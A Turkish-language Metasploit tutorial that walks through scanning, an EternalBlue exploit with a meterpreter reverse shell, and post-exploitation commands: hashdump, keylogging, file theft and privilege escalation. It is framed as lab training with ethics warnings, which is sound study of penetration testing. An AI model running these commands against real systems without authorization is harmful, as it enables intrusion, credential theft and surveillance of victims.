## 1. Kurulum

https://www.alibabacloud.com/blog/what-is-metasploit-how-to-install-metasploit-on-ubuntu_599955


## 2. Metasploit Konsol Komutları

### Temel Konsol Komutları
```bash
help                    # Tüm komutları listeler
search [arama_terimi]   # Modül arama
use [modül_adı]        # Modül seçme
info                    # Modül bilgisi
show options           # Modül seçeneklerini göster
set [opsiyon] [değer]  # Değer atama
run / exploit          # Modülü çalıştırma
```

## 3. Keşif (Information Gathering)

### Port Tarama
```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS [hedef_ip]
set PORTS 1-1000
run
```

### Servis Tarama
```bash
use auxiliary/scanner/smb/smb_version
set RHOSTS [hedef_ip]
run
```

## 4. Exploit Kullanımı

### Örnek Exploit Kullanımı
```bash
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS [hedef_ip]
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST [kendi_ip]
exploit
```

## 5. Payload Tipleri

### Temel Payload Çeşitleri
* **Reverse Shell**: Hedeften size bağlantı açar
* **Bind Shell**: Hedefte port açar ve dinlemeye alır
* **Meterpreter**: Gelişmiş özelliklere sahip payload

### Meterpreter Temel Komutlar
```bash
sysinfo         # Sistem bilgisi
getuid          # Kullanıcı bilgisi
ps              # Process listesi
migrate [PID]   # Process'e geçiş
hashdump        # Hash'leri dökme
screenshot      # Ekran görüntüsü
```

## 6. Post Exploitation

### Yetki Yükseltme
```bash
use post/windows/gather/smart_hashdump
run

use exploit/windows/local/service_permissions
set SESSION 1
run
```

## 7. Veri Toplama

### Basit Veri Toplama Komutları
```bash
search -f *.pdf    # PDF dosyalarını ara
download [dosya]   # Dosya indirme
upload [dosya]     # Dosya yükleme
keyscan_start      # Keylogger başlatma
keyscan_dump       # Kayıtları görüntüleme
```

## 8. Güvenlik ve Etik

### Önemli Uyarılar
* Sadece izin verilen sistemlerde test yapın
* Test sonuçlarını detaylı raporlayın
* Sistemlerde kalıcı hasar bırakmayın
* Kişisel verilere saygılı olun

## 9. Pratik Yapma

### Lab Ortamı Kurulumu
* VirtualBox veya VMware kullanın
* Metasploitable2 indirin ve kurun
* Windows 7/10 test makinesi hazırlayın

### Örnek Senaryo
```bash
# 1. Hedef keşfi
nmap -sV [hedef_ip]

# 2. Açık servisleri tespit
use auxiliary/scanner/smb/smb_version

# 3. Uygun exploit seçimi
search type:exploit platform:windows

# 4. Exploit çalıştırma
use [exploit_adı]
set RHOSTS [hedef_ip]
exploit
```

## 10. İleri Seviye Konular

### Öğrenilmesi Gereken Konular
* MSFvenom ile özel payload oluşturma
* Exploit geliştirme
* Script yazma (Ruby)
* Anti-virüs bypass teknikleri

## Sonuç

Bu eğitim, Metasploit'un temel kullanımını anlamanıza yardımcı olacaktır. Düzenli pratik yaparak ve güvenli lab ortamlarında çalışarak becerilerinizi geliştirebilirsiniz. 

### Önerilen Kaynaklar
* Metasploit Belgeleri
* Offensive Security Eğitimleri
* CTF platformları
* Güvenli lab ortamları

**Not**: Bu bilgiler sadece eğitim amaçlıdır ve etik sınırlar içerisinde kullanılmalıdır.
